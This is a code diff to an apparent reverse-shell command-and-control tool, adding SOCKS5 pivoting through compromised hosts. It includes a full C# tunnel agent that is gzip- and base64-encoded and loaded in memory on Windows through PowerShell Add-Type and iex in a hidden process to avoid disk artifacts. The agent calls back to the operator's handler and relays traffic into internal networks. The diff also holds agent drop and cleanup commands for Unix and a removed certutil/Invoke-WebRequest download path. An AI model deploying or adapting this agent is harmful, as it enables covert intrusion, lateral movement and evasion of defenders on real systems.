@@ -1,16 +1,13 @@
 """SOCKS5 internal pivoting through reverse shell sessions."""
 
 import base64
+import gzip
 import json
 import queue
 import select
 import socket
 import struct
 import time
-import http.server
-import socketserver
-import random
-import urllib.parse
 import threading
 
 from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC
@@ -43,6 +40,8 @@ LOW_WATER = 1048576
 MAX_FRAME = 4194304
 RECV_SIZE = 65536
 SOCK_BUF = 524288
+IDLE_STREAM_TTL = 300.0
+COMPACT_THRESHOLD = 65536
 
 def recv_exact(conn, n):
     data = b''
@@ -136,11 +135,19 @@ def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
 def reset_entry(entry):
     with entry['buf_lock']:
         entry['buf'].clear()
+        entry['head'] = 0
     entry['drain'].set()
 
 def gc_streams(streams, lock):
+    now = time.time()
     with lock:
-        dead = [sid for sid, e in list(streams.items()) if e.get('closed')]
+        dead = []
+        for sid, e in list(streams.items()):
+            if e.get('closed'):
+                dead.append(sid)
+                continue
+            if now - e.get('last_activity', now) > IDLE_STREAM_TTL:
+                dead.append(sid)
         for sid in dead:
             entry = streams.pop(sid, None)
             if entry:
@@ -157,7 +164,7 @@ def pump(entry):
     sock.settimeout(1.0)
     while not entry.get('closed'):
         with buf_lock:
-            buf_len = len(entry['buf'])
+            buf_len = len(entry['buf']) - entry['head']
         if buf_len >= HIGH_WATER:
             drain.clear()
         if buf_len >= MAX_BUF or not drain.is_set():
@@ -171,7 +178,8 @@ def pump(entry):
                 break
             with buf_lock:
                 entry['buf'].extend(piece)
-                buf_len = len(entry['buf'])
+                entry['last_activity'] = time.time()
+                buf_len = len(entry['buf']) - entry['head']
                 if buf_len >= HIGH_WATER:
                     drain.clear()
                 elif buf_len <= LOW_WATER:
@@ -185,14 +193,25 @@ def pump(entry):
 
 def read_buf(entry, max_bytes):
     with entry['buf_lock']:
-        if entry['buf']:
-            n = min(max_bytes, len(entry['buf']))
-            chunk = bytes(entry['buf'][:n])
-            del entry['buf'][:n]
-            if len(entry['buf']) <= LOW_WATER:
-                entry['drain'].set()
-            return chunk, entry['closed']
-        return b'', entry['closed']
+        buf = entry['buf']
+        head = entry['head']
+        avail = len(buf) - head
+        if avail <= 0:
+            if head:
+                del buf[:head]
+                entry['head'] = 0
+            if entry['closed'] and buf:
+                buf.clear()
+            return b'', entry['closed']
+        n = min(max_bytes, avail)
+        chunk = bytes(buf[head:head + n])
+        entry['head'] = head + n
+        if entry['head'] >= COMPACT_THRESHOLD and entry['head'] * 2 >= len(buf):
+            del buf[:entry['head']]
+            entry['head'] = 0
+        if len(buf) - entry['head'] <= LOW_WATER:
+            entry['drain'].set()
+        return chunk, entry['closed']
 
 def close_stream(streams, lock, sid):
     with lock:
@@ -235,8 +254,10 @@ def serve(conn, streams, lock):
                     remote = socket.create_connection((host, port), timeout=10)
                     tune_sock(remote)
                     entry = {
-                        'sock': remote, 'buf': bytearray(), 'buf_lock': threading.Lock(),
+                        'sock': remote, 'buf': bytearray(), 'head': 0,
+                        'buf_lock': threading.Lock(),
                         'drain': threading.Event(), 'closed': False,
+                        'last_activity': time.time(),
                     }
                     entry['drain'].set()
                     with lock:
@@ -254,6 +275,7 @@ def serve(conn, streams, lock):
                     continue
                 try:
                     entry['sock'].sendall(data)
+                    entry['last_activity'] = time.time()
                     send_json(conn, {'ok': True, 'sid': sid})
                 except Exception as exc:
                     entry['closed'] = True
@@ -274,8 +296,6 @@ def serve(conn, streams, lock):
                         send_json(conn, {'ok': True, 'sid': sid, 'data': '', 'closed': True})
                     continue
                 chunk, closed = read_buf(entry, max_bytes)
-                if closed:
-                    reset_entry(entry)
                 if op == 'recvb':
                     send_recvb(conn, sid, chunk, closed)
                 else:
@@ -356,6 +376,359 @@ if __name__ == '__main__':
     main()
 '''
 
+_REMOTE_AGENT_CS_SOURCE = r'''
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+public static class TornadoTunnel {
+    const int CHANNELS   = 12;
+    const int MAX_FRAME  = 4194304;
+    const int RECV_SIZE  = 65536;
+    const int HIGH_WATER = 3145728;
+    const int LOW_WATER  = 1048576;
+    const int SOCK_BUF   = 524288;
+    const int COMPACT_THRESHOLD = 65536;
+    const long IDLE_STREAM_TTL_MS = 300000L;
+
+    static readonly object L = new object();
+    static readonly Dictionary<uint, Entry> Streams = new Dictionary<uint, Entry>();
+
+    sealed class Entry {
+        public Socket Sock;
+        public readonly MemoryStream Buf = new MemoryStream();
+        public long Head = 0;
+        public long LastActivityTicks = DateTime.UtcNow.Ticks;
+        public readonly ManualResetEventSlim Drain = new ManualResetEventSlim(true);
+        public volatile bool Closed;
+        public readonly object Gate = new object();
+    }
+
+    static byte[] RecvExact(Socket s, int n) {
+        var b = new byte[n];
+        int off = 0;
+        while (off < n) {
+            int r;
+            try { r = s.Receive(b, off, n - off, SocketFlags.None); }
+            catch { return null; }
+            if (r <= 0) return null;
+            off += r;
+        }
+        return b;
+    }
+
+    static void SendAll(Socket s, byte[] d) {
+        int off = 0;
+        while (off < d.Length) {
+            int w;
+            try { w = s.Send(d, off, d.Length - off, SocketFlags.None); }
+            catch { return; }
+            if (w <= 0) return;
+            off += w;
+        }
+    }
+
+    static byte[] ReadFrame(Socket s, out byte typ) {
+        typ = 0;
+        var hdr = RecvExact(s, 4);
+        if (hdr == null) return null;
+        int len = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
+        if (len <= 0 || len > MAX_FRAME) return null;
+        var body = RecvExact(s, len);
+        if (body == null) return null;
+        typ = body[0];
+        var rest = new byte[len - 1];
+        Buffer.BlockCopy(body, 1, rest, 0, len - 1);
+        return rest;
+    }
+
+    static void SendFrame(Socket s, byte typ, byte[] body) {
+        int total = body.Length + 1;
+        var f = new byte[4 + total];
+        f[0] = (byte)(total >> 24); f[1] = (byte)(total >> 16);
+        f[2] = (byte)(total >> 8);  f[3] = (byte)total;
+        f[4] = typ;
+        Buffer.BlockCopy(body, 0, f, 5, body.Length);
+        SendAll(s, f);
+    }
+
+    static void SendJson(Socket s, string j) {
+        SendFrame(s, 0, Encoding.UTF8.GetBytes(j));
+    }
+
+    static uint BE32(byte[] b, int o) {
+        return (uint)((b[o] << 24) | (b[o + 1] << 16) | (b[o + 2] << 8) | b[o + 3]);
+    }
+
+    static string JGet(string j, string k) {
+        string pat = "\"" + k + "\":";
+        int i = j.IndexOf(pat);
+        if (i < 0) return null;
+        i += pat.Length;
+        while (i < j.Length && (j[i] == ' ' || j[i] == '\t')) i++;
+        if (i >= j.Length) return null;
+        if (j[i] == '"') {
+            i++;
+            var sb = new StringBuilder();
+            while (i < j.Length && j[i] != '"') {
+                if (j[i] == '\\' && i + 1 < j.Length) {
+                    i++;
+                    char c = j[i];
+                    if (c == 'n') sb.Append('\n');
+                    else if (c == 't') sb.Append('\t');
+                    else if (c == 'r') sb.Append('\r');
+                    else sb.Append(c);
+                } else sb.Append(j[i]);
+                i++;
+            }
+            return sb.ToString();
+        }
+        int st = i;
+        while (i < j.Length && j[i] != ',' && j[i] != '}') i++;
+        return j.Substring(st, i - st).Trim();
+    }
+
+    static void Tune(Socket s) {
+        try {
+            s.NoDelay = true;
+            s.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
+            s.ReceiveBufferSize = SOCK_BUF;
+            s.SendBufferSize = SOCK_BUF;
+        } catch {}
+    }
+
+    static void CloseEntry(Entry e) {
+        if (e.Closed) return;
+        e.Closed = true;
+        lock (e.Gate) { e.Buf.SetLength(0); e.Head = 0; }
+        e.Drain.Set();
+        try { e.Sock.Close(); } catch {}
+    }
+
+    static void Pump(Entry e) {
+        try { e.Sock.ReceiveTimeout = 1000; } catch {}
+        var buf = new byte[RECV_SIZE];
+        while (!e.Closed) {
+            bool waitNeeded;
+            lock (e.Gate) waitNeeded = (e.Buf.Length - e.Head) >= HIGH_WATER;
+            if (waitNeeded) e.Drain.Reset();
+            e.Drain.Wait(200);
+            if (e.Closed) break;
+            int r;
+            try { r = e.Sock.Receive(buf); }
+            catch (SocketException) { continue; }
+            catch { CloseEntry(e); break; }
+            if (r <= 0) { CloseEntry(e); break; }
+            lock (e.Gate) {
+                e.LastActivityTicks = DateTime.UtcNow.Ticks;
+                e.Buf.Position = e.Buf.Length;
+                e.Buf.Write(buf, 0, r);
+                long avail = e.Buf.Length - e.Head;
+                if (avail >= HIGH_WATER) e.Drain.Reset();
+                else if (avail <= LOW_WATER) e.Drain.Set();
+            }
+        }
+    }
+
+    static byte[] ReadBuf(Entry e, int max, out bool closed) {
+        lock (e.Gate) {
+            long len = e.Buf.Length;
+            long avail = len - e.Head;
+            if (avail <= 0) {
+                if (e.Head > 0) {
+                    e.Buf.SetLength(0);
+                    e.Buf.Position = 0;
+                    e.Head = 0;
+                }
+                closed = e.Closed;
+                return new byte[0];
+            }
+            int take = (int)Math.Min((long)max, avail);
+            var outb = new byte[take];
+            e.Buf.Position = e.Head;
+            e.Buf.Read(outb, 0, take);
+            e.Head += take;
+            if (e.Head >= COMPACT_THRESHOLD && e.Head * 2 >= e.Buf.Length) {
+                int rem = (int)(e.Buf.Length - e.Head);
+                if (rem > 0) {
+                    var rest = new byte[rem];
+                    e.Buf.Position = e.Head;
+                    e.Buf.Read(rest, 0, rem);
+                    e.Buf.SetLength(0);
+                    e.Buf.Position = 0;
+                    e.Buf.Write(rest, 0, rem);
+                } else {
+                    e.Buf.SetLength(0);
+                    e.Buf.Position = 0;
+                }
+                e.Head = 0;
+            }
+            if (e.Buf.Length - e.Head <= LOW_WATER) e.Drain.Set();
+            closed = e.Closed;
+            return outb;
+        }
+    }
+
+    static void CloseStream(uint sid) {
+        Entry e;
+        lock (L) {
+            if (!Streams.TryGetValue(sid, out e)) return;
+            Streams.Remove(sid);
+        }
+        CloseEntry(e);
+    }
+
+    static void PurgeStreams() {
+        List<Entry> all;
+        lock (L) {
+            all = new List<Entry>(Streams.Values);
+            Streams.Clear();
+        }
+        foreach (var e in all) CloseEntry(e);
+    }
+
+    static void GC() {
+        List<Entry> dead = new List<Entry>();
+        long nowTicks = DateTime.UtcNow.Ticks;
+        lock (L) {
+            var keys = new List<uint>();
+            foreach (var kv in Streams) {
+                if (kv.Value.Closed) { keys.Add(kv.Key); continue; }
+                long idleMs = (nowTicks - kv.Value.LastActivityTicks) / TimeSpan.TicksPerMillisecond;
+                if (idleMs > IDLE_STREAM_TTL_MS) keys.Add(kv.Key);
+            }
+            foreach (var sid in keys) {
+                Entry e;
+                if (Streams.TryGetValue(sid, out e)) { dead.Add(e); Streams.Remove(sid); }
+            }
+        }
+        foreach (var e in dead) CloseEntry(e);
+    }
+
+    static void Serve(Socket conn) {
+        try {
+            while (true) {
+                byte typ;
+                var body = ReadFrame(conn, out typ);
+                if (body == null) break;
+
+                if (typ == 0) {
+                    string j = Encoding.UTF8.GetString(body);
+                    string op = JGet(j, "op");
+                    if (op == "ping") {
+                        SendJson(conn, "{\"ok\":true,\"op\":\"pong\"}");
+                    } else if (op == "connect") {
+                        uint sid = uint.Parse(JGet(j, "sid"));
+                        string host = JGet(j, "host");
+                        int port = int.Parse(JGet(j, "port"));
+                        CloseStream(sid);
+                        try {
+                            var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                            s.Connect(host, port);
+                            Tune(s);
+                            var e = new Entry { Sock = s };
+                            e.Drain.Set();
+                            lock (L) Streams[sid] = e;
+                            var t = new Thread(() => Pump(e)); t.IsBackground = true; t.Start();
+                            SendJson(conn, "{\"ok\":true,\"sid\":" + sid + "}");
+                        } catch (Exception ex) {
+                            string msg = ex.Message.Replace("\"", "'").Replace("\\", "/");
+                            SendJson(conn, "{\"ok\":false,\"sid\":" + sid + ",\"error\":\"" + msg + "\"}");
+                        }
+                    } else if (op == "close" || op == "reset") {
+                        uint sid = uint.Parse(JGet(j, "sid"));
+                        CloseStream(sid);
+                        SendJson(conn, "{\"ok\":true,\"sid\":" + sid + "}");
+                    } else if (op == "gc") {
+                        GC();
+                        SendJson(conn, "{\"ok\":true}");
+                    } else if (op == "purge") {
+                        PurgeStreams();
+                        SendJson(conn, "{\"ok\":true}");
+                    } else {
+                        SendJson(conn, "{\"ok\":false,\"error\":\"unknown\"}");
+                    }
+                } else if (typ == 1) {
+                    if (body.Length < 4) continue;
+                    uint sid = BE32(body, 0);
+                    int dlen = body.Length - 4;
+                    Entry e; bool ok = false;
+                    lock (L) Streams.TryGetValue(sid, out e);
+                    if (e != null && !e.Closed) {
+                        try {
+                            var data = new byte[dlen];
+                            Buffer.BlockCopy(body, 4, data, 0, dlen);
+                            SendAll(e.Sock, data);
+                            e.LastActivityTicks = DateTime.UtcNow.Ticks;
+                            ok = true;
+                        } catch { CloseEntry(e); }
+                    }
+                    SendJson(conn, "{\"ok\":" + (ok ? "true" : "false") + ",\"sid\":" + sid + (ok ? "" : ",\"closed\":true") + "}");
+                } else if (typ == 2) {
+                    if (body.Length < 8) continue;
+                    uint sid = BE32(body, 0);
+                    int max = (int)BE32(body, 4);
+                    Entry e;
+                    lock (L) Streams.TryGetValue(sid, out e);
+                    if (e == null) {
+                        var resp = new byte[5];
+                        resp[0] = (byte)(sid >> 24); resp[1] = (byte)(sid >> 16);
+                        resp[2] = (byte)(sid >> 8); resp[3] = (byte)sid;
+                        resp[4] = 1;
+                        SendFrame(conn, 3, resp);
+                        continue;
+                    }
+                    bool closed;
+                    var chunk = ReadBuf(e, max, out closed);
+                    var rsp = new byte[5 + chunk.Length];
+                    rsp[0] = (byte)(sid >> 24); rsp[1] = (byte)(sid >> 16);
+                    rsp[2] = (byte)(sid >> 8); rsp[3] = (byte)sid;
+                    rsp[4] = (byte)(closed ? 1 : 0);
+                    Buffer.BlockCopy(chunk, 0, rsp, 5, chunk.Length);
+                    SendFrame(conn, 3, rsp);
+                }
+            }
+        } catch {}
+        finally { GC(); }
+    }
+
+    static void Worker(string host, int port, string token) {
+        while (true) {
+            Socket conn = null;
+            try {
+                conn = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                conn.Connect(host, port);
+                Tune(conn);
+                SendJson(conn, "{\"op\":\"register\",\"token\":\"" + token + "\",\"magic\":\"TornadoRevC2\",\"ver\":2}");
+                byte typ;
+                var ack = ReadFrame(conn, out typ);
+                if (ack == null || typ != 0) { conn.Close(); Thread.Sleep(2000); continue; }
+                if (JGet(Encoding.UTF8.GetString(ack), "ok") != "true") { conn.Close(); Thread.Sleep(2000); continue; }
+                Serve(conn);
+            } catch {}
+            try { if (conn != null) conn.Close(); } catch {}
+            Thread.Sleep(1000);
+        }
+    }
+
+    public static void Run(string host, int port, string token) {
+        for (int i = 0; i < CHANNELS; i++) {
+            var t = new Thread(() => Worker(host, port, token));
+            t.IsBackground = true;
+            t.Start();
+        }
+        Thread.Sleep(Timeout.Infinite);
+    }
+}
+'''
+
+
+_CS_GZ_B64 = base64.b64encode(
+    gzip.compress(_REMOTE_AGENT_CS_SOURCE.encode('utf-8'), compresslevel=9)
+).decode('ascii')
 
 def _set_keepalive(sock):
     try:
@@ -533,50 +906,6 @@ class TunnelManager:
         self._tunnel_port = None
         self._last_error = ''
         self._ensure_tunnel_listener()
-
-    def _start_agent_http_server(self, content, port=None):
-        """Start a simple HTTP server serving the agent content on a random port.
-        Returns (port, server_thread, stop_event)."""
-        if port is None:
-            # Try a range of ports
-            for _ in range(20):
-                port = random.randint(8000, 9000)
-                try:
-                    server = socketserver.TCPServer(('0.0.0.0', port), self._make_agent_handler(content))
-                    break
-                except OSError:
-                    continue
-            else:
-                raise RuntimeError("Could not find a free port for HTTP server")
-        else:
-            server = socketserver.TCPServer(('0.0.0.0', port), self._make_agent_handler(content))
-        
-        stop_event = threading.Event()
-        def serve():
-            while not stop_event.is_set():
-                server.handle_request()
-            server.server_close()
-        thread = threading.Thread(target=serve, daemon=True)
-        thread.start()
-        return port, thread, stop_event, server
-
-    def _make_agent_handler(self, content):
-        """Factory for a request handler that serves the given content."""
-        class AgentHandler(http.server.SimpleHTTPRequestHandler):
-            def do_GET(self):
-                parsed = urllib.parse.urlparse(self.path)
-                if parsed.path == '/agent.py':
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'application/octet-stream')
-                    self.send_header('Content-Length', str(len(content)))
-                    self.end_headers()
-                    self.wfile.write(content)
-                else:
-                    self.send_response(404)
-                    self.end_headers()
-            def log_message(self, format, *args):
-                pass
-        return AgentHandler
 
     def _ensure_tunnel_listener(self):
         with self._lock:
@@ -797,10 +1126,10 @@ class TunnelManager:
         return up, down
 
     def _close_stream_on_agent(self, client_sock, sid, preferred=None):
-        """Tell the agent to close a stream and discard any buffered data."""
-        self._channel_request(
+        resp, _ = self._channel_request(
             client_sock, {'op': 'close', 'sid': sid}, timeout=3.0, preferred=preferred,
         )
+        return resp
 
     def _wait_for_channel(self, client_sock, token, timeout=30.0):
         ready = self._channel_ready.get(token)
@@ -980,65 +1309,79 @@ class TunnelManager:
         )
 
     def _remote_paths(self, client_sock, shell_type, token):
-        name = f".tornado_agent_{token}.py"
-        if shell_type == 'windows':
-            return self.h.inmemory.resolve_staging_path(client_sock, shell_type, name)
         return f"/tmp/.tornado_agent_{token}.py"
 
     def _upload_agent(self, client_sock, agent_path, shell_type, handler_ip=None):
-        """
-        Upload the agent script to the remote target.
-        For Windows: uses an HTTP server + Invoke-WebRequest / certutil.
-        For Linux: uses base64 + base64 -d.
-        """
-        if shell_type != 'windows':
-            # Linux: base64 one-shot (unchanged)
-            data = _REMOTE_AGENT_SOURCE.encode('utf-8')
-            b64 = base64.b64encode(data).decode('ascii')
-            sh_cmd = (
-                f"echo '{b64}' | base64 -d > '{agent_path}' 2>/dev/null && "
-                f"printf '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
-            )
-            result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=30.0)
-            return result == 'OK'
+        """Upload the Unix Python agent to the remote target via base64."""
+        data = _REMOTE_AGENT_SOURCE.encode('utf-8')
+        b64 = base64.b64encode(data).decode('ascii')
+        sh_cmd = (
+            f"echo '{b64}' | base64 -d > '{agent_path}' 2>/dev/null && "
+            f"printf '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
+        )
+        result = self._tunnel_marked(client_sock, sh_cmd, '', 'unix', timeout=30.0)
+        return result == 'OK'
 
-        # ----- Windows: HTTP download -----
-        if handler_ip is None:
-            handler_ip = client_sock.getsockname()[0]
-            self._log(client_sock, f"Using handler IP {handler_ip} for HTTP server")
+    def _build_windows_launcher_ps(self, host, port, token):
+        marker = f"TNB_{token}"
 
-        content = _REMOTE_AGENT_SOURCE.encode('utf-8')
-        try:
-            port, thread, stop_event, server = self._start_agent_http_server(content)
-        except RuntimeError as e:
-            self._set_error(f"HTTP server start failed: {e}")
-            return False
-
-        # Build download command
-        url = f"http://{handler_ip}:{port}/agent.py"
-        # Escape the agent path for PowerShell
-        escaped_path = agent_path.replace("'", "''")
-        # Try Invoke-WebRequest first, fallback to certutil
-        ps_cmd = (
-            f"$ErrorActionPreference='Stop'; "
-            f"try {{ Invoke-WebRequest -Uri '{url}' -OutFile '{escaped_path}' -UseBasicParsing -ErrorAction Stop; "
-            f"Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}' }} "
-            f"catch {{ certutil -urlcache -f '{url}' '{escaped_path}' 2>$null; "
-            f"if ($?) {{ Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}' }} "
-            f"else {{ Write-Output '{TUNNEL_MARK_START}FAIL{TUNNEL_MARK_END}' }} }}"
+        code = (
+            "$ErrorActionPreference='Stop';"
+            "try{"
+            "Add-Type -TypeDefinition ((New-Object IO.StreamReader("
+            "(New-Object IO.Compression.GZipStream("
+            f"(New-Object IO.MemoryStream(,[Convert]::FromBase64String('{_CS_GZ_B64}'))),"
+            "[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()) "
+            "-Language CSharp;"
+            f"[TornadoTunnel]::Run('{host}',{port},'{token}')"
+            "}catch{"
+            "$m=($_|Out-String);"
+            "[Console]::Error.WriteLine('TNB_ERR '+$m);"
+            "try{$m|Out-File $env:TNBERR -EA SilentlyContinue}catch{};"
+            "exit 1"
+            "}"
         )
 
-        result = self._tunnel_marked(client_sock, '', ps_cmd, 'windows', timeout=60.0)
+        code_b64 = base64.b64encode(code.encode('utf-8')).decode('ascii')
 
-        # Stop the HTTP server (after download)
-        stop_event.set()
-        thread.join(timeout=2.0)
+        child_args = "-NoProfile -NonInteractive -Command iex $env:TNBCODE"
 
-        if result == 'OK':
-            return True
-        else:
-            self._set_error(f"HTTP download failed: {result or 'no response'}")
-            return False
+        outer_ps = (
+            f"$env:TNBCODE=[Text.Encoding]::UTF8.GetString("
+            f"[Convert]::FromBase64String('{code_b64}'));"
+            f"$env:TNBERR=Join-Path $env:TEMP 'tnb_err_{token}.txt';"
+            f"Remove-Item $env:TNBERR -EA SilentlyContinue;"
+            f"$m='{marker}';"
+            f"Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" -EA SilentlyContinue "
+            f"| Where-Object {{ $_.CommandLine -and $_.CommandLine.Contains($m) }} "
+            f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }};"
+            f"$si=New-Object Diagnostics.ProcessStartInfo;"
+            f"$si.FileName='powershell.exe';"
+            f"$si.Arguments='{child_args}';"
+            f"$si.UseShellExecute=$false;"
+            f"$si.CreateNoWindow=$true;"
+            f"$si.RedirectStandardError=$true;"
+            f"$si.RedirectStandardOutput=$true;"
+            f"$p=[Diagnostics.Process]::Start($si);"
+            f"$errTask=$p.StandardError.ReadToEndAsync();"
+            f"$outTask=$p.StandardOutput.ReadToEndAsync();"
+            f"Start-Sleep -Milliseconds 5000;"
+            f"if($p.HasExited){{"
+            f"  $err='';try{{$err=$errTask.Result}}catch{{}};"
+            f"  $out='';try{{$out=$outTask.Result}}catch{{}};"
+            f"  $d='exited='+$p.ExitCode;"
+            f"  if($err){{$d+=' err='+($err -replace '\\s+',' ')}}"
+            f"  elseif($out){{$d+=' out='+($out -replace '\\s+',' ')}};"
+            f"  if(Test-Path $env:TNBERR){{"
+            f"    $r=Get-Content $env:TNBERR -Raw -EA SilentlyContinue;"
+            f"    if($r -and -not $err){{$d+=' file='+($r -replace '\\s+',' ')}}"
+            f"  }};"
+            f"  Write-Output ('{TUNNEL_MARK_START}FAIL:'+$d+'{TUNNEL_MARK_END}')"
+            f"}}else{{"
+            f"  Write-Output '{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
+            f"}}"
+        )
+        return outer_ps
 
     def _deploy_agent(self, client_sock):
         cached = self._session_agents.get(client_sock)
@@ -1052,7 +1395,7 @@ class TunnelManager:
 
         self._ensure_tunnel_listener()
         shell_type = info.get('type', 'unix')
-        if not self._check_python(client_sock, shell_type):
+        if shell_type != 'windows' and not self._check_python(client_sock, shell_type):
             self._set_error('Python is not installed on the remote host')
             self._log(client_sock, 'Tunnel aborted: Python missing')
             print(f"{self.h.colors['red']}Python not found on target – tunnel cannot start, use ligolong/chisel plugin instead{self.h.colors['end']}")
@@ -1061,16 +1404,9 @@ class TunnelManager:
         token = self._agent_token(client_sock)
         tunnel_port = self._tunnel_port
         revshell_port = int(self.h.revshell_port)
-        agent_path = self._remote_paths(client_sock, shell_type, token)
-        path_esc = self.h._escape_path(agent_path, shell_type)
         token_esc = token.replace("'", "'\\''")
         print(f"Using handler IP: {handler_ip}")
-        print(f"Agent path: {agent_path}")
         print(f"Tunnel port: {tunnel_port}")
-
-        if not self._upload_agent(client_sock, agent_path, shell_type, handler_ip):
-            print(f"{self.h.colors['red']}Upload failed: {self._last_error}{self.h.colors['end']}")
-            return None
 
         self._token_sessions[token] = client_sock
         ready = threading.Event()
@@ -1079,18 +1415,18 @@ class TunnelManager:
         self._drop_pool(client_sock)
 
         if shell_type == 'windows':
-            deploy_ps = (
-                f"$p='{path_esc}';"
-                f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
-                f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
-                f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
-                f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
-                f"Start-Process -FilePath $py -ArgumentList @($p,'{handler_ip}',{tunnel_port},'{token}',{revshell_port}) "
-                f"-WindowStyle Hidden | Out-Null;"
-                f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
-            )
-            payload = self._tunnel_marked(client_sock, '', deploy_ps, 'windows', timeout=25.0)
+            # ---- Windows: in-memory C# agent via Add-Type, no disk artifact ----
+            print(f"{self.h.colors['cyan']}Windows: in-memory C# tunnel agent{self.h.colors['end']}")
+            launcher = self._build_windows_launcher_ps(handler_ip, tunnel_port, token)
+            payload = self._tunnel_marked(client_sock, '', launcher, 'windows', timeout=45.0)
         else:
+            # ---- Linux/Unix: unchanged Python agent on disk ----
+            agent_path = self._remote_paths(client_sock, shell_type, token)
+            path_esc = self.h._escape_path(agent_path, shell_type)
+            print(f"Agent path: {agent_path}")
+            if not self._upload_agent(client_sock, agent_path, shell_type):
+                print(f"{self.h.colors['red']}Upload failed: {self._last_error}{self.h.colors['end']}")
+                return None
             unix_cmd = (
                 f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                 f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
@@ -1103,13 +1439,27 @@ class TunnelManager:
             self._set_error('Python not installed on remote host')
             return None
         if payload != 'OK':
-            self._set_error('tunnel agent failed to start')
+            if payload and payload.startswith('FAIL:'):
+                detail = payload[5:].strip() or 'unknown failure'
+                self._set_error(f'tunnel agent failed to start — {detail}')
+                print(
+                    f"{self.h.colors['red']}Tunnel agent failed: "
+                    f"{detail}{self.h.colors['end']}"
+                )
+            else:
+                self._set_error('tunnel agent failed to start')
             return None
         if not self._wait_for_channel(client_sock, token, timeout=60.0):
             self._set_error(f'agent did not connect to handler port {tunnel_port}')
             return None
 
-        agent = {'token': token, 'ready': True, 'remote_path': agent_path, 'ver': AGENT_VERSION}
+        agent = {
+            'token': token,
+            'ready': True,
+            'remote_path': agent_path if shell_type != 'windows' else None,
+            'transport': 'cs-mem' if shell_type == 'windows' else 'py-disk',
+            'ver': AGENT_VERSION,
+        }
         self._session_agents[client_sock] = agent
         self._last_error = ''
         n = len(self._alive_conns(client_sock))
@@ -1168,28 +1518,27 @@ class TunnelManager:
             self._drop_pool(client_sock)
             return False
 
-        agent_path = (agent or {}).get('remote_path') or self._remote_paths(
-            client_sock, shell_type, token
-        )
-        path_esc = self.h._escape_path(agent_path, shell_type)
-        token_esc = token.replace("'", "'\\''")
-
         result = None
         for _attempt in range(2):
             if shell_type == 'windows':
+                marker = f"TNB_{token}"
                 cleanup_ps = (
-                    f"Get-CimInstance Win32_Process -Filter "
-                    f"\"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
+                    f"$m='{marker}'; "
+                    f"Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" "
+                    f"| Where-Object {{ $_.CommandLine -and $_.CommandLine.Contains($m) }} "
                     f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force "
-                    f"-ErrorAction SilentlyContinue }};"
-                    f"Remove-Item -LiteralPath '{path_esc}' -Force "
-                    f"-ErrorAction SilentlyContinue;"
+                    f"-ErrorAction SilentlyContinue }}; "
                     f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
                 )
                 result = self._tunnel_marked(
                     client_sock, '', cleanup_ps, 'windows', timeout=20.0
                 )
             else:
+                agent_path = (agent or {}).get('remote_path') or self._remote_paths(
+                    client_sock, shell_type, token
+                )
+                path_esc = self.h._escape_path(agent_path, shell_type)
+                token_esc = token.replace("'", "'\\''")
                 unix_cmd = (
                     f"pkill -9 -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                     f"rm -f '{path_esc}' 2>/dev/null; "
@@ -1428,7 +1777,6 @@ class TunnelManager:
         return True
 
     def _socks_test(self, client_sock, host, port):
-        """Test TCP reachability to an internal host through the tunnel agent."""
         try:
             port = int(port)
         except (TypeError, ValueError):
@@ -1440,9 +1788,41 @@ class TunnelManager:
             print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
             return True
 
+        with self._lock:
+            proxy = next(
+                (p for p in self._proxies.values()
+                 if p.get('client_sock') is client_sock),
+                None,
+            )
+        agent = self._session_agents.get(client_sock)
+        if proxy is None or not agent or not agent.get('ready'):
+            print(
+                f"{self.h.colors['yellow']}No SOCKS5 proxy is running for "
+                f"#{info['id']}. Start one first:{self.h.colors['end']}"
+            )
+            print(
+                f"{self.h.colors['cyan']}  from main menu : socks {info['id']} <listen_port>"
+                f"{self.h.colors['end']}"
+            )
+            print(
+                f"{self.h.colors['cyan']}  inside session : socks <listen_port>"
+                f"{self.h.colors['end']}"
+            )
+            return True
+
+        if not self._has_channels(client_sock):
+            self._wait_for_channel(client_sock, agent['token'], timeout=8.0)
+            if not self._has_channels(client_sock):
+                print(
+                    f"{self.h.colors['red']}SOCKS proxy {proxy['id']} has no live "
+                    f"tunnel channels — try 'socks reset' or restart the proxy"
+                    f"{self.h.colors['end']}"
+                )
+                return True
+
         sid = self._next_stream_id(client_sock)
         started = time.time()
-        resp = self._agent_request(
+        resp, _conn = self._channel_request(
             client_sock,
             {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
             timeout=45.0,
@@ -1454,7 +1834,9 @@ class TunnelManager:
